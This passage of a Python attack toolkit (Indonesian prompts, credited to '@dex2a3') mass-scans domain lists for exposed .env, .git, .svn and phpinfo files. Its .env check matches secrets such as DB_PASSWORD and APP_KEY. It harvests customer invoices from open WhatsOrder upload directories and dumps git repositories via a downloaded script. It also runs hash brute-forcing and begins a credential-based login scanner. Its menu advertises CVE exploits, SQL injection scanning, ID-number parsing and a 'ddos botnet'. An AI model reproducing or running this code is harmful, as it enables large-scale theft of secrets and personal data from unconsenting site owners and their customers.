        r'<script[^>]*src=["\']([^"\']+)["\']',
        r'<img[^>]*src=["\']([^"\']+)["\']',
        r'<iframe[^>]*src=["\']([^"\']+)["\']',
        r'<embed[^>]*src=["\']([^"\']+)["\']',
        r'<object[^>]*data=["\']([^"\']+)["\']',
        r'background=["\']([^"\']+)["\']',
        r'poster=["\']([^"\']+)["\']',
        r'manifest=["\']([^"\']+)["\']',
        r'<source[^>]*src=["\']([^"\']+)["\']',
        r'<track[^>]*src=["\']([^"\']+)["\']',
    ]
    
    skip_extensions = [
        '.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.svg', 
        '.ico', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.zip', '.rar',
        '.webm', '.ogg', '.wav', '.flv', '.avi', '.mov', '.wmv'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            if any(match.lower().endswith(ext) for ext in skip_extensions):
                continue
            if not match or match.startswith('#') or match.startswith('javascript:'):
                continue
            if match not in links:
                links.append(match)
    
    return links

def normalize_url(url, domain, current_url):
    if not url:
        return ''
    if url.startswith('http://') or url.startswith('https://'):
        return url
    if url.startswith('//'):
        return f"https:{url}"
    if url.startswith('/'):
        return f"https://{domain}{url}"
    if not url.startswith('http'):
        if current_url:
            base = current_url.rsplit('/', 1)[0]
            return f"{base}/{url}"
        else:
            return f"https://{domain}/{url}"
    return url

def spinner(message, duration=2):
    chars = ['-', '/', '|', '\\']
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f'\r{YELLOW}{chars[i % 4]} {message}{RESET}')
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    sys.stdout.write('\r' + ' ' * 50 + '\r')
    sys.stdout.flush()

def scan_with_spinner(message, future_obj, total=None):
    done = False
    result = None
    chars = ['-', '/', '|', '\\']
    counter = 0
    
    def task_wrapper():
        nonlocal done, result, counter
        try:
            result = future_obj.result()
        except Exception as e:
            result = None
        finally:
            done = True
    
    thread = threading.Thread(target=task_wrapper)
    thread.daemon = True
    thread.start()
    
    i = 0
    while not done:
        counter += 1
        if total:
            sys.stdout.write(f'\r{YELLOW}{chars[i % 4]} {message} [{counter}/{total}]{RESET}')
        else:
            sys.stdout.write(f'\r{YELLOW}{chars[i % 4]} {message}{RESET}')
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    
    thread.join()
    sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
    sys.stdout.flush()
    
    return result

def get_threads():
    try:
        t = input(f"{YELLOW}[?] Jumlah threads (default 20): {RESET}").strip()
        if t == "":
            return 20
        t = int(t)
        if t < 1:
            return 20
        if t > 50:
            print(f"{YELLOW}[!] Maks 50, pake 50{RESET}")
            return 50
        return t
    except:
        return 20


ASCII_V2 = f"""
{CYAN}╔══════════════════════════════════════════════════════════════════════════╗
{CYAN}║  {RED}██╗  ██╗███████╗██╗  ██╗{GREEN}██╗  ██████╗  ██████╗ ███╗   ██╗{CYAN}                ║
{CYAN}║  {RED}██║  ██║██╔════╝╚██╗██╔╝{GREEN}██║ ██╔════╝ ██╔═══██╗████╗  ██║{CYAN}                ║
{CYAN}║  {RED}███████║█████╗   ╚███╔╝ {GREEN}██║ ██║  ███╗██║   ██║██╔██╗ ██║{CYAN}                ║
{CYAN}║  {RED}██╔══██║██╔══╝   ██╔██╗ {GREEN}██║ ██║   ██║██║   ██║██║╚██╗██║{CYAN}                ║
{CYAN}║  {RED}██║  ██║███████╗██╔╝ ██╗{GREEN}██║ ╚██████╔╝╚██████╔╝██║ ╚████║{CYAN}                ║
{CYAN}║  {RED}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{GREEN}╚═╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝{CYAN}                ║
{CYAN}║                                                                          ║
{CYAN}║  {YELLOW}████████╗ ██████╗  ██████╗ ██╗     ███████╗ █████╗ ███╗   ██╗{CYAN}           ║
{CYAN}║  {YELLOW}╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝██╔══██╗████╗  ██║{CYAN}           ║
{CYAN}║  {YELLOW}   ██║   ██║   ██║██║   ██║██║     █████╗  ███████║██╔██╗ ██║{CYAN}           ║
{CYAN}║  {YELLOW}   ██║   ██║   ██║██║   ██║██║     ██╔══╝  ██╔══██║██║╚██╗██║{CYAN}           ║
{CYAN}║  {YELLOW}   ██║   ╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║██║ ╚████║{CYAN}           ║
{CYAN}║  {YELLOW}   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝{CYAN}           ║
{CYAN}║                                                                          ║
{CYAN}╚══════════════════════════════════════════════════════════════════════════╝{RESET}
"""

def fungsi_os():
    os_info = {
        'name': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'hostname': platform.node()
    }
    
    if os.name == 'posix':
        os_info['family'] = 'Unix/Linux'
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        os_info['distro'] = line.split('=')[1].strip().strip('"')
                        break
        except:
            os_info['distro'] = 'Unknown Linux'
    elif os.name == 'nt':
        os_info['family'] = 'Windows'
    elif os.name == 'mac':
        os_info['family'] = 'macOS'
    
    os_info['username'] = getpass.getuser()
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        os_info['local_ip'] = s.getsockname()[0]
        s.close()
    except:
        os_info['local_ip'] = '127.0.0.1'
    
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            os_info['public_ip'] = response.text.strip()
        else:
            os_info['public_ip'] = None
    except:
        os_info['public_ip'] = None
    
    os_info['cpu_count'] = os.cpu_count()
    
    return os_info

def show_menu():
    try:
        info = fungsi_os()
    except Exception as e:
        print(f"Error: {e}")
        return
    
    print(ASCII_V2)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{RESET}  {YELLOW}📱 DEVICE INFORMATION | 👤 Develops @dex2a3{RESET}                             {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}                                                                          {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}🖥️  OS{RESET}         : {info['name']} {info['release']}                                 {CYAN}║{RESET}")
    
    if 'distro' in info:
        print(f"{CYAN}║{RESET}  {GREEN}📦 Distro{RESET}     : {info['distro']}                                  {CYAN}║{RESET}")
    
    print(f"{CYAN}║{RESET}  {GREEN}💻 Hostname{RESET}   : {info['hostname']}                                                    {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}👤 User{RESET}       : {info['username']}                                                    {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}⚙️  Machine{RESET}    : {info['machine']}                                                  {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}🧠 CPU Cores{RESET}  : {info['cpu_count']}                                                       {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}🌐 Local IP{RESET}   : {info['local_ip']}                                            {CYAN}║{RESET}")
    
    if info.get('public_ip'):
        print(f"{CYAN}║{RESET}  {GREEN}🌍 Public IP{RESET}  : {info['public_ip']}                                          {CYAN}║{RESET}")
    
    print(f"{CYAN}║{RESET}                                                                          {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════════════╝{RESET}")

    print(f"\n{CYAN}[+] FITUR SCANNER: {RESET}")
    print(f"{GREEN}1. Scan Domain Massal {RESET}")
    print(f"{GREEN}2. Scan .env {RESET}")
    print(f"{GREEN}3. Scan .git {RESET}")
    print(f"{GREEN}4. Scan phpinfo{RESET}")
    print(f"{GREEN}5. Scan Sensitive Files (advanced){RESET}")
    print(f"{GREEN}6. (CVE-2026-9612) {RESET}")
    print(f"{GREEN}7. (CVE-2026-9227) {RESET}")
    print(f"{GREEN}8. Domain Sorter (regex) {RESET}")
    print(f"{GREEN}9. Cheker wordperss & plugin{RESET}")
    print(f"{GREEN}10. Parser NIK KTP {RESET}")
    print(f"{GREEN}11. Sorter domain (wordpress){RESET}")
    print(f"{GREEN}12. Scan SQL Injection (HTML parser){RESET}")
    print(f"{GREEN}13. Sorter domain (drupal){RESET}")
    print(f"{GREEN}14. scan port 22 ssh {RESET}")
    print(f"{GREEN}15. exploit .env format(url|base64:key){RESET}")
    print(f"{GREEN}16. exploit git eksposure{RESET}")
    print(f"{GREEN}17. exploit .svn eksposure{RESET}")
    print(f"{GREEN}18. scan .svn exsposure{RESET}")
    print(f"{GREEN}19. Check proxy format(ip:port){RESET}")
    print(f"{GREEN}20. setup api ddos botnet{RESET}")
    print(f"{GREEN}21. subfinder domain{RESET}")
    print(f"{GREEN}22. Hash decrpyt(auto.setupenvironment){RESET}")
    print(f"{RED}23. Keluar {RESET}")

def cek_domain(domain):
    protocols = ['https', 'http']
    
    for proto in protocols:
        url = f"{proto}://{domain}"
        try:
            r = requests.get(url, timeout=10, allow_redirects=True, verify=False)
            
            if r.status_code in [200, 301, 302, 303, 307, 308]:
                return domain, r.status_code, proto
            
        except requests.exceptions.ConnectionError:
            pass
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.SSLError:
            try:
                r = requests.get(f"http://{domain}", timeout=10, allow_redirects=True, verify=False)
                if r.status_code in [200, 301, 302, 303, 307, 308]:
                    return domain, r.status_code, 'http'
            except:
                pass
        except:
            pass
    
    return None, None, None

def scan_domain_massal():
    print(f"\n[+] Scan Domain Massal")
    
    file_domain = input("[+] File domain: ").strip()
    
    if not file_domain:
        print("[-] Kosong!")
        return
    
    if not os.path.exists(file_domain):
        print(f"[?] File {file_domain} gak ada!")
        return
    
    result_file = input("[+] Nama file hasil (default: domain_aktif.txt): ").strip()
    if not result_file:
        result_file = "domain_aktif.txt"
    
    domains = baca_domain(file_domain)
    if not domains:
        print("[-] Domain kosong!")
        return
    
    threads = get_threads()
    total = len(domains)
    
    print(f"[+] Total domain: {total}, threads: {threads}")
    print("[*] Scanning...")
    
    found = []
    found_lock = threading.Lock()
    seen = set()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(cek_domain, domain): domain for domain in domains}
        
        for i, future in enumerate(as_completed(futures), 1):
            domain = futures[future]
            try:
                result, status, proto = future.result(timeout=30)
                if result:
                    with found_lock:
                        if result not in seen:
                            seen.add(result)
                            found.append(result)
                            
                            if status == 200:
                                color = GREEN
                            elif status in [301, 302, 303, 307, 308]:
                                color = YELLOW
                            else:
                                color = RED
                            
                            print(f"{color}[+] {i}/{total} {result} [{status}]{RESET}")
                            with open(result_file, "a") as f:
                                f.write(f"{result}\n")
            except:
                pass
    
    if found:
        print(f"\n[+] Found {len(found)} domain aktif")
        print(f"[+] Saved: {result_file}")
    else:
        print("[-] Gak ada domain aktif")
    
    print("\n[!] Scan selesai!")
    sys.exit(0)

def exploit_git():
    url = input(f"{GREEN}Masukkan url format (https://url.com/.git): {RESET}")
    save_path = input(f"{YELLOW}[+] Lokasi save (default: ./git_dump): {RESET}").strip()
    if not save_path:
        save_path = "./git_dump"
    
    if os.path.exists("git_dumper.py"):
        os.system(f"python git_dumper.py {url} {save_path}")
        print(f"{GREEN}[+] Selesai! Hasil disimpan di: {save_path}{RESET}")
    else:
        print(f"{RED}[-] File git_dumper.py gak ada!{RESET}")
        print(f"{GREEN}[+] Otomatis installasi")
        os.system("wget https://raw.githubusercontent.com/arthaud/git-dumper/refs/heads/master/git_dumper.py")
        print("Sukses installasion, silahkan ctrl+z untuk mulai ulang!")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def install_modules():
    modules = ["yachalk", "tqdm", "pyfiglet", "numpy"]
    for mod in modules:
        try:
            __import__(mod)
        except ImportError:
            print(f"[!] Menginstall {mod}...")
            subprocess.run([sys.executable, "-m", "pip", "install", mod])
            print(f"[✓] {mod} terinstall")

def setup_venv():
    if not os.path.exists("venv"):
        print("[*] Membuat virtual environment...")
        subprocess.run([sys.executable, "-m", "venv", "venv"])
        print("[✓] Virtual environment berhasil dibuat")
    else:
        print("[✓] Virtual environment sudah ada")
    
    if os.name == 'nt':
        python_path = "venv\\Scripts\\python"
        activate = "venv\\Scripts\\activate"
    else:
        python_path = "venv/bin/python"
        activate = "source venv/bin/activate"
    
    print(f"[*] Aktifkan venv: {activate}")
    print("[*] Menginstall modul di venv...")
    subprocess.run([python_path, "-m", "pip", "install", "--upgrade", "pip"])
    subprocess.run([python_path, "-m", "pip", "install", "yachalk", "tqdm", "pyfiglet", "numpy"])
    print("[✓] Modul terinstall di venv")
    
    return python_path

def hash_brute():
    target_dir = "hashbrute_new/hashbrute"
    
    if not os.path.exists(target_dir):
        print(f"[×] Folder {target_dir} tidak ditemukan!")
        sys.exit(0)
    
    os.chdir(target_dir)
    print(f"[✓] Pindah ke: {os.getcwd()}")
    
    if not os.path.exists("brute.py"):
        print("[×] File brute.py tidak ditemukan!")
        sys.exit(0)
    
    python_path = setup_venv()
    
    print("[✓] Menjalankan brute.py...")
    pw_hash = input("Masukkan hash: ")
    wordlist = input("Masukkan wordlist: ")
    
    subprocess.run([python_path, "brute.py", "-hash", pw_hash, "-f", wordlist])

def exploit_svn():
    url = input(f"{GREEN}Masukkan url nya: {RESET}")
    if not url:
        print(f"{RED}[!] URL tidak boleh kosong!{RESET}")
        sys.exit(1)
    if not url.startswith(('http://', 'https://')):
     url = 'http://' + url

    if not os.path.exists("svn_extractor.py"):
        print(f"{RED}[!] File svn_extractor.py tidak ditemukan!{RESET}")
        sys.exit(1)
    
    print(f"{GREEN}[+] Menjalankan svn_extractor.py terhadap: {url}{RESET}")
    command = f"python svn_extractor.py --url {url} --debug"
    os.system(command)
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_svn():
    domain_file = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    
    if not domain_file:
        print(f"{RED}[-] Kosong{RESET}")
        sys.exit(0)
    
    if not os.path.exists(domain_file):
        print(f"{RED}[?] File {domain_file} gak ada{RESET}")
        sys.exit(0)
    
    domains = baca_domain(domain_file)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    
    svn_paths = [
        '/.svn/entries',           
        '/.svn/wc.db',            
        '/.svn/all-wcprops',      
        '/.svn/format',           
        '/.svn/wcprops',          
        '/.svn/props',            
        '/.svn/text-base',        
        '/.svn/prop-base',         
        '/.svn/tmp',               
        '/.svn/pristine',       
    ]
    
    total = len(domains)
    print(f"{GREEN}[+] Total domains: {total}, threads: {threads}{RESET}")
    
    found = []
    found_lock = threading.Lock()
    
    progress = {"count": 0}
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        
        for domain in domains:
            future = executor.submit(scan_svn_from_html, domain, svn_paths)
            futures[future] = domain
        
        for future in as_completed(futures):
            domain = futures[future]
            progress["count"] += 1
            
            try:
                result = future.result(timeout=30)
                
                if result:
                    with found_lock:
                        for url in result:
                            print(f"{GREEN}[+] {progress['count']}/{total} {url}{RESET}")
                            found.append(url)
                        
                        with open("svn_found.txt", "a") as f:
                            for url in result:
                                f.write(f"{url}\n")
                else:
                    print(f"{YELLOW}[-] {progress['count']}/{total} {domain} - Not found{RESET}")
                    
            except Exception as e:
                print(f"{RED}[-] {progress['count']}/{total} {domain} - Error: {str(e)[:50]}{RESET}")

    if found:
        print(f"\n{GREEN}[+] Found {len(found)} SVN endpoints{RESET}")
        print(f"{YELLOW}[+] Saved: svn_found.txt{RESET}")
        
        print(f"\n{BLUE}[!] Ringkasan URL yang ditemukan:{RESET}")
        for url in found[:10]:
            print(f"  - {url}")
        if len(found) > 10:
            print(f"  ... dan {len(found)-10} lainnya")
    else:
        print(f"{RED}[-] Tidak ada SVN yang ditemukan{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_env():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        sys.exit(0)
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        sys.exit(0)
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    env_paths = [
        '/.env', '/.env.backup', '/.env.bak', '/.env.old',
        '/.env.local', '/.env.production', '/.env.staging',
        '/laravel/.env', '/public/.env', '/api/.env'
    ]
    
    total = len(domains)
    print(f"{GREEN}[+] Scanning .env dengan HTML parser...{RESET}")
    print(f"{GREEN}[+] Total domains: {total}, threads: {threads}{RESET}")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            futures.append(executor.submit(scan_env_from_html, domain, env_paths))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning env", future, total)
            if result:
                for url in result:
                    print(f"{GREEN}[+] {i}/{total} {url}{RESET}")
                    found.append(url)
                with open("env.txt", "a") as f:
                    for url in result:
                        f.write(f"{url}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} env {RESET}")
        print(f"{YELLOW}[+] Saved: env.txt {RESET}")
    else:
        print(f"{RED}[-] Gak ada env{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{ConnectionResetError}")
    sys.exit(0)

def scan_env_from_html(domain, env_paths):
    results = []
    visited = set()
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        # Scan path .env
        for path in env_paths:
            url = f"https://{domain}{path}"
            try:
                r = session.get(url, timeout=5, allow_redirects=False, verify=False, headers=headers)
                
                if r.status_code in [301, 302, 303, 307, 308]:
                    redirect_url = r.headers.get('Location', '')
                    if redirect_url and not is_safe_redirect(redirect_url, domain):
                        r2 = session.get(url, timeout=5, allow_redirects=True, verify=False, headers=headers)
                        if r2.status_code == 200 and valid_env(r2.text, r2.headers):
                            results.append(url)
                            visited.add(url)
                elif r.status_code == 200:
                    if valid_env(r.text, r.headers):
                        results.append(url)
                        visited.add(url)
            except:
                pass
        
        # Scan HTML untuk link .env
        base_url = f"https://{domain}/"
        try:
            response = session.get(base_url, timeout=10, allow_redirects=True, verify=False, headers=headers)
            if response.status_code == 200:
                content = response.text
                links = extract_all_links(content, domain)
                
                for link in links:
                    if link in visited:
                        continue
                    if '.env' in link.lower():
                        full_url = normalize_url(link, domain, response.url)
                        if full_url:
                            try:
                                r = session.get(full_url, timeout=5, allow_redirects=False, verify=False, headers=headers)
                                
                                if r.status_code in [301, 302, 303, 307, 308]:
                                    redirect_url = r.headers.get('Location', '')
                                    if redirect_url and not is_safe_redirect(redirect_url, domain):
                                        r2 = session.get(full_url, timeout=5, allow_redirects=True, verify=False, headers=headers)
                                        if r2.status_code == 200 and valid_env(r2.text, r2.headers):
                                            results.append(full_url)
                                            visited.add(full_url)
                                elif r.status_code == 200:
                                    if valid_env(r.text, r.headers):
                                        results.append(full_url)
                                        visited.add(full_url)
                            except:
                                pass
        except:
            pass
        
        return results
        
    except Exception as e:
        return results

def valid_env(content, headers):
    if not content or len(content) < 10:
        return False
    
    content_type = headers.get('Content-Type', '').lower()

    if 'text/html' in content_type:
        html_tags = ['<!DOCTYPE', '<html', '<head', '<body', '<div', '<script', '<style']
        html_count = 0
        for tag in html_tags:
            if tag.lower() in content.lower():
                html_count += 1
        if html_count >= 3:
            return False
    
    env_keywords = [
        'APP_ENV', 'APP_DEBUG', 'APP_KEY', 'DB_HOST', 'DB_DATABASE',
        'DB_USERNAME', 'DB_PASSWORD', 'CI_ENVIRONMENT', 'encryption.key',
        'database.default', 'SESSION_DRIVER'
    ]
    
    content_lower = content.lower()
    keyword_count = 0
    for keyword in env_keywords:
        if keyword.lower() in content_lower:
            keyword_count += 1
    
    if keyword_count >= 2:
        return True
    
    lines = content.split('\n')
    config_lines = 0
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#') and '=' in line:
            if re.match(r'^[A-Z_]+=.+$', line) or re.match(r'^[a-z_]+\.[a-z_]+ = .+$', line):
                config_lines += 1
    
    return config_lines >= 3

def is_safe_redirect(redirect_url, domain):
    if not redirect_url:
        return True
    
    if not redirect_url.startswith(f"https://{domain}") and not redirect_url.startswith(f"http://{domain}"):
        return True
    
    parsed = urlparse(redirect_url)
    path = parsed.path.lower()
    
    if '.env' in path:
        return False
    
    web_extensions = ['.html', '.htm', '.php', '.asp', '.aspx', '.jsp', '.do', '.action']
    for ext in web_extensions:
        if path.endswith(ext):
            return True
    
    if path == '/' or path == '':
        return True
    
    safe_keywords = ['login', 'signin', 'auth', 'error', '404', 'home', 'index', 'welcome']
    for keyword in safe_keywords:
        if keyword in path:
            return True
    
    return False

def extract_all_links(content, domain):
    links = []
    patterns = [
        r'href=["\']([^"\']+)["\']',
        r'src=["\']([^"\']+)["\']',
        r'action=["\']([^"\']+)["\']'
    ]
    for pattern in patterns:
        found = re.findall(pattern, content, re.IGNORECASE)
        links.extend(found)
    return links

def scan_proxy():
    if os.path.exists("scan_proxy.py"):
        os.system("python scan_proxy.py")
    else:
        print(f"{RED}[-] File scan_proxy.py gak ada!{RESET}")
    sys.exit(0)
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)
    
def scan_git():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        sys.exit(0)
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        sys.exit(0)
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    git_paths = ['/.git/config', '/.git/HEAD', '/.git/index', '/.git/refs/heads/master']
    
    total = len(domains)
    print(f"{GREEN}[+] Scanning .git dengan HTML parser...{RESET}")
    print(f"{GREEN}[+] Total domains: {total}, threads: {threads}{RESET}")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            futures.append(executor.submit(scan_git_from_html, domain, git_paths))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning git", future, total)
            if result:
                for url in result:
                    print(f"{GREEN}[+] {i}/{total} {url}{RESET}")
                    found.append(url)
                with open("git_found.txt", "a") as f:
                    for url in result:
                        f.write(f"{url}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} git{RESET}")
        print(f"{YELLOW}[+] Saved: git_found.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada git{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_git_from_html(domain, git_paths):
    results = []
    visited = set()
    
    try:
        for path in git_paths:
            url = f"https://{domain}{path}"
            try:
                r = requests.get(url, timeout=5, allow_redirects=True, verify=False)
                if r.status_code in [200, 301, 302, 303, 307, 308]:
                    if valid_git(r.text, r.headers):
                        git_base = f"https://{domain}/.git/"
                        if git_base not in results:
                            results.append(git_base)
                        visited.add(url)
            except:
                pass
        
        base_url = f"https://{domain}/"
        try:
            response = requests.get(base_url, timeout=10, allow_redirects=True, verify=False)
            if response.status_code == 200:
                content = response.text
                links = extract_all_links(content, domain)
                
                for link in links:
                    if link in visited:
                        continue
                    if '.git' in link.lower():
                        full_url = normalize_url(link, domain, response.url)
                        if full_url:
                            try:
                                r = requests.get(full_url, timeout=5, allow_redirects=True, verify=False)
                                if r.status_code in [200, 301, 302, 303, 307, 308]:
                                    if valid_git(r.text, r.headers):
                                        git_base = full_url.split('/.git')[0] + '/.git/'
                                        if git_base not in results:
                                            results.append(git_base)
                                        visited.add(full_url)
                            except:
                                pass
        except:
            pass
        
        return results
        
    except Exception as e:
        return results

def scan_phpinfo():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        sys.exit(0)
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        sys.exit(0)
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    phpinfo_paths = ['/phpinfo.php', '/info.php', '/php.php', '/test.php', '/infophp.php', '/php_info.php']
    
    total = len(domains)
    print(f"{GREEN}[+] Scanning phpinfo dengan HTML parser...{RESET}")
    print(f"{GREEN}[+] Total domains: {total}, threads: {threads}{RESET}")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            futures.append(executor.submit(scan_phpinfo_from_html, domain, phpinfo_paths))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning phpinfo", future, total)
            if result:
                for url in result:
                    print(f"{GREEN}[+] {i}/{total} {url}{RESET}")
                    found.append(url)
                with open("phpinfo_found.txt", "a") as f:
                    for url in result:
                        f.write(f"{url}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} phpinfo{RESET}")
        print(f"{YELLOW}[+] Saved: phpinfo_found.txt {RESET}")
    else:
        print(f"{RED}[-] Gak ada phpinfo {RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_phpinfo_from_html(domain, phpinfo_paths):
    results = []
    visited = set()
    
    try:
        for path in phpinfo_paths:
            url = f"https://{domain}{path}"
            try:
                r = requests.get(url, timeout=5, allow_redirects=True, verify=False)
                if r.status_code in [200, 301, 302, 303, 307, 308]:
                    if valid_phpinfo(r.text, r.headers):
                        results.append(url)
                        visited.add(url)
            except:
                pass
        
        base_url = f"https://{domain}/"
        try:
            response = requests.get(base_url, timeout=10, allow_redirects=True, verify=False)
            if response.status_code == 200:
                content = response.text
                links = extract_all_links(content, domain)
                
                for link in links:
                    if link in visited:
                        continue
                    for path in phpinfo_paths:
                        if path in link.lower():
                            full_url = normalize_url(link, domain, response.url)
                            if full_url:
                                try:
                                    r = requests.get(full_url, timeout=5, allow_redirects=True, verify=False)
                                    if r.status_code in [200, 301, 302, 303, 307, 308]:
                                        if valid_phpinfo(r.text, r.headers):
                                            results.append(full_url)
                                            visited.add(full_url)
                                            break
                                except:
                                    pass
        except:
            pass
        
        return results
        
    except Exception as e:
        return results

def scan_whatsorder_invoices():
    file_domain = input(f"{YELLOW}[+] Nama File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        sys.exit(0)
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        sys.exit(0)
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    paths = [
        '/wp-content/uploads/whatsorder_invoices/',
        '/wp-content/uploads/whatsorder/',
        '/wp-content/uploads/whats_order_invoices/'
    ]
    
    total = len(domains) * len(paths)
    print(f"{GREEN}[+] Scanning whatsorder invoices...{RESET}")
    print(f"{GREEN}[+] Total tasks: {total}, threads: {threads}{RESET}")
    
    found_files = set()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path in paths:
                futures.append(executor.submit(check_directory_listing, domain, path))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning whatsorder", future, total)
            if result:
                try:
                    r = requests.get(result, timeout=10, allow_redirects=True, verify=False)
                    if r.status_code in [200, 301, 302]:
                        pattern = r'order-(\d+)\.html'
                        matches = re.findall(pattern, r.text)
                        
                        if matches:
                            for order_id in matches:
                                file_url = result + f"order-{order_id}.html"
                                try:
                                    fr = requests.get(file_url, timeout=5, allow_redirects=True, verify=False)
                                    if fr.status_code in [200, 301, 302] and valid_whatsorder_invoice(fr.text, fr.headers):
                                        found_files.add(file_url)
                                        print(f"{GREEN}[+] {i}/{total} {file_url}{RESET}")
                                except:
                                    pass
                except Exception as e:
                    pass
    
    if found_files:
        print(f"\n{GREEN}[+] Found {len(found_files)} invoices{RESET}")
        with open("whatsorder_invoices.txt", "w") as f:
            for url in found_files:
                f.write(f"{url}\n")
        print(f"{YELLOW}[+] Saved: whatsorder_invoices.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada invoice{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def valid_whatsorder_invoice(content, headers):
    content_lower = content.lower()
    if '<html' not in content_lower and '<!doctype' not in content_lower:
        return False
    keywords = ['order', 'invoice', 'payment', 'billing', 'shipping', 'total', 'subtotal', 'customer', 'email', 'phone']
    keyword_count = sum(1 for k in keywords if k in content_lower)
    if keyword_count < 3:
        return False
    order_indicators = ['qty', 'price', 'product', 'item', 'total']
    if not any(k in content_lower for k in order_indicators):
        return False
    return True

def check_directory_listing(domain, path):
    url = f"https://{domain}{path}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=True, verify=False)
        if r.status_code in [200, 301, 302]:
            if 'Index of /' in r.text or 'Parent Directory' in r.text:
                if 'order-' in r.text and '.html' in r.text:
                    return url
    except:
        pass
    return None

def scan_gutenbee_with_login():
    file_cred = input(f"{YELLOW}[+] File kredensial (domain|email|password): {RESET}").strip()
    if not file_cred or not os.path.exists(file_cred):
        print(f"{RED}[-] File ga ketemu{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    
    creds = []
    try:
        with open(file_cred, "r") as f:
            for line in f:
                line = line.strip()
